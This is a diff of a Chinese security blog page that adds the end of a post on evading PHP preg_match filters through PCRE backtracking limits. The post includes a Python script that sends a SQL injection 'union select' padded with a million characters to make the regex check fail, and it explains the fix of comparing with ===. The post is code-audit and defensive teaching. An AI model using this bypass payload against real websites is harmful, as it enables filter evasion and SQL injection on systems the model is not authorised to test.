+<p>这可能也是很多时候构造超长字符串，能绕过waf的原因之一（另一个原因是waf需要考虑性能）</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>在某些情况下（POST参数+特殊的正则）：可以利用正则回溯，使得preg_match函数返回false，进而绕过正则表达式的判断。代码审计时可以额外关注全局过滤处的正则表达式是否可用这种方法绕过。</p>
+<p>之前出过maccms出过一个前台RCE，就是利用的这种方法来绕过全局过滤函数的，详情可参考<a href="https://mochazz.github.io/2020/01/08/maccmsV8%E5%89%8D%E5%8F%B0RCE(preg_match%E7%BB%95%E8%BF%87)/" target="_blank" rel="noopener">maccmsV8前台RCE(preg_match绕过)</a></p>
+<p><strong>利用方式：</strong>发送超长字符串，可以用burp的intruder，payload类型选Character blocks</p>
+<p><img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20200812173241780.png" alt="image-20200812173241780"></p>
+<p>也可以改编下面这个python脚本进行利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">NUM = <span class="number">1000000</span>;<span class="comment"># 你想填充的字符串数</span></span><br><span class="line">URL = <span class="string">"http://php.test/select.php"</span> <span class="comment"># 地址</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">"union select 1,2,3,4,5 /*&#123;&#125;*/ "</span>.format(<span class="string">"A"</span>*NUM) </span><br><span class="line">post_data = &#123;<span class="string">"p"</span>:param&#125;</span><br><span class="line">resp = requests.post(url=URL, data=post_data)</span><br><span class="line"></span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="结论（修复方案）"><a href="#结论（修复方案）" class="headerlink" title="结论（修复方案）"></a>结论（修复方案）</h2><ol>
+<li>如果用<code>preg_match</code>对字符串进行匹配，一定要使用<code>===</code>全等号来判断返回值，如：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_php($input) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样，即使正则执行失败返回false，也不会进入if语句。</p>
+<ol start="2">
+<li><p>再分享一个先知上很不错的黑白盒审计的思维导图，来源<a href="https://xz.aliyun.com/t/1720" target="_blank" rel="noopener">https://xz.aliyun.com/t/1720</a> <img src="https://xz.aliyun.com/forum//media/upload/picture/20171205165928-99798f14-d99a-1.png" alt="img"></p>
+</li>
+<li><p>最后，推荐一个网站，这个网站可以检查你写的正则表达式和对应的字符串匹配时是否有问题。</p>
+</li>
+</ol>
+<p>   <img src="%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%82%B9%E4%B9%8B%E5%88%A9%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20200812170735197.png" alt="image-20200812170735197"></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li>PHP利用PCRE回溯次数限制绕过某些安全限制 <a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/190794.html</a></li>
+<li>正则表达式回溯漏洞<a href="https://blog.csdn.net/dl71181/article/details/101281495" target="_blank" rel="noopener">https://blog.csdn.net/dl71181/article/details/101281495</a></li>
+<li>正则表达式 — 回溯陷阱 - 五维思考 - 博客园<a href="https://www.cnblogs.com/zhaoshujie/p/10278919.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaoshujie/p/10278919.html</a></li>
+<li>HTTP/1.1: Protocol Parameters <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.2.1" target="_blank" rel="noopener">https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.2.1</a></li>
+<li>PHP手册-PCRE正则语法 <a href="https://www.php.net/manual/zh/regexp.reference.meta.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/regexp.reference.meta.php</a></li>
+<li>regex debugger <a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></li>
+<li>maccmsV8前台RCE(preg_match绕过)<a href="https://mochazz.github.io/2020/01/08/maccmsV8%E5%89%8D%E5%8F%B0RCE(preg_match%E7%BB%95%E8%BF%87)/" target="_blank" rel="noopener">https://mochazz.github.io/2020/01/08/maccmsV8%E5%89%8D%E5%8F%B0RCE(preg_match%E7%BB%95%E8%BF%87)/</a></li>
 </ul>
 
           
@@ -430,7 +404,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+    <a class="extend prev" rel="prev" href="/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
   </nav>
 
 
@@ -476,7 +450,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
